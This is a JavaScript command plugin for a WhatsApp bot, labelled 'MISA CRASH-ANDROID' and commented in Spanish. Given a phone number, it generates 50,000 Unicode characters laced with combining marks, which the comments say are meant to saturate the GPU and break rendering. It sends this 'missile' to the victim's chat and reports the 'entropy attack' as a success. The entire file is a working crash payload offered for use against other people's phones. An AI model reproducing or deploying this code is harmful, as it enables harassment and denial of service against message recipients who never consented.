/* * 👑 MISA CRASH-ANDROID
 * Canal: https://whatsapp.com/channel/0029Vav6SNC7z4kofN80pW27
 * Github: https://github.com/yannielmedrano1-sys/Misa-Bot
 */

import { jidDecode } from '@whiskeysockets/baileys'

const crashAndroidMisa = {
    name: 'crash-android',
    alias: ['ola', 'ca', 'crash'],
    category: 'travas', // Categoría personalizada para tu sistema
    noPrefix: true,

    run: async (conn, m, { args, command, text }) => {
        // Validación para que no tire error si no hay número
        if (!args[0]) {
            return conn.sendMessage(m.chat, { 
                text: `✧ ‧₊˚ *MISA CRASH SYSTEM* ୧ֹ˖ ⑅ ࣪⊹\n\n✰ \`Uso\`: ${command} [número]\n> ✐ *Ejemplo:* ${command} 1809xxxxxxx` 
            }, { quoted: m })
        }

        try {
            // Limpiamos el número del objetivo
            let targetNum = args[0].replace(/[^0-9]/g, '')
            let targetJid = targetNum + '@s.whatsapp.net'
            
            // Reacción de ejecución
            await conn.sendMessage(m.chat, { react: { text: '💀', key: m.key } })

            // Generador de Entropía (50k Unicodes únicos para saturar GPU)
            const generarCarga = (cant) => {
                let str = ""
                const bloques = [0x12000, 0x13000, 0x14400, 0x17000, 0x1D400]
                for (let i = 0; i < cant; i++) {
                    let bloque = bloques[i % bloques.length]
                    str += String.fromCodePoint(bloque + (i % 800))
                    // Inyectamos combinadores verticales para romper el renderizado
                    if (i % 8 === 0) str += String.fromCodePoint(0x0345) 
                }
                return str
            }

            const cargaFinal = generarCarga(50000)

            // Envío del misil al objetivo
            await conn.sendMessage(targetJid, { text: cargaFinal })

            // Aviso de éxito en tu chat
            await conn.sendMessage(m.chat, { 
                text: `✅ *Ataque de entropía enviado a @${targetNum}*`,
                mentions: [targetJid]
            }, { quoted: m })

        } catch (err) {
            console.error('Error en Misa Crash:', err)
            m.reply('❌ *Hubo un fallo en el sistema de carga.*')
        }
    }
}

export default crashAndroidMisa
